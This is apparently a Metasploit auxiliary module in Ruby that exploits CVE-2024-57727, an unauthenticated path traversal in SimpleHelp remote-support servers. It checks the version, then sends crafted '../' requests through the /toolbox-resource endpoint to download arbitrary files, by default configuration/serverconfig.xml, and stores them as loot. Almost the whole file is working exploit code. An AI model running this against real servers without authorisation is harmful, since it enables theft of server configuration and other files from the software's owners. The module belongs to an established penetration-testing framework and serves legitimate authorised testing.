##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SimpleHelp Path Traversal Vulnerability CVE-2024-57727',
        'Description' => %q{
          There exists a path traversal vulnerability in the /toolbox-resource endpoint that enables unauthenticated
          remote attackers to download arbitrary files from the SimpleHelp server via crafted HTTP requests
        },
        'Author' => [
          'horizon3ai', # discovery
          'imjdl',      # CVE-2024-57727 PoC
          'jheysel-r7'  # module
        ],
        'References' => [
          [ 'URL', 'https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/'], # Discovery
          [ 'URL', 'https://simple-help.com/kb---security-vulnerabilities-01-2025#security-vulnerabilities-in-simplehelp-5-5-7-and-earlier'], # Vendor Advisory
          [ 'URL', 'https://rustlang.rs/posts/simple-help/'], # PoC for Path Traversal CVE-2024-57727
          [ 'URL', 'https://attackerkb.com/topics/G4CTOrbDx0/cve-2024-57727'], # PoC for Path Traversal CVE-2024-57727
          [ 'CVE', '2024-57727'],
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-01-12',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => [ ]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SimpleHelp installation', '/']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', 'configuration/serverconfig.xml']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 2 ])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'allversions')
    )

    return Exploit::CheckCode::Unknown('Unable to retrieve SimpleHelp version.') unless res&.body =~ /Visual Version:\s*(\d+\.\d+(?:\.\d+))/

    version = Rex::Version.new(Regexp.last_match(1))

    # Patched versions are: 5.5.8 or 5.4.10 or 5.3.9
    if version.between?(Rex::Version.new('5.5.0'), Rex::Version.new('5.5.7')) ||
       version.between?(Rex::Version.new('5.4.0'), Rex::Version.new('5.4.9')) ||
       version.between?(Rex::Version.new('5.3.0'), Rex::Version.new('5.3.8'))
      return Exploit::CheckCode::Appears("Version detected: #{version}")
    end

    Exploit::CheckCode::Safe("Version detected: #{version}")
  end

  def run_host(ip)
    directory = %w[alertsdb invitations secmsg toolbox-resources backups sslconfig translations notifications techprefs history recordings templates html remotework toolbox].sample
    traverse = '../' * datastore['DEPTH']

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/toolbox-resource/../#{directory}/#{traverse}/#{datastore['FILEPATH']}")
    )

    unless res&.code == 200 && res.body.present?
      print_error('Nothing was downloaded')
      return
    end

    vprint_line(res.body)
    print_good("Downloaded #{res.body.length} bytes")

    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: name,
      info: 'Module triggered a 200 reply',
      refs: references
    )

    path = store_loot(
      'simplehelp.traversal',
      'text/plain',
      ip,
      res.body,
      datastore['FILEPATH']
    )
    print_good("File saved in: #{path}")
  end
end
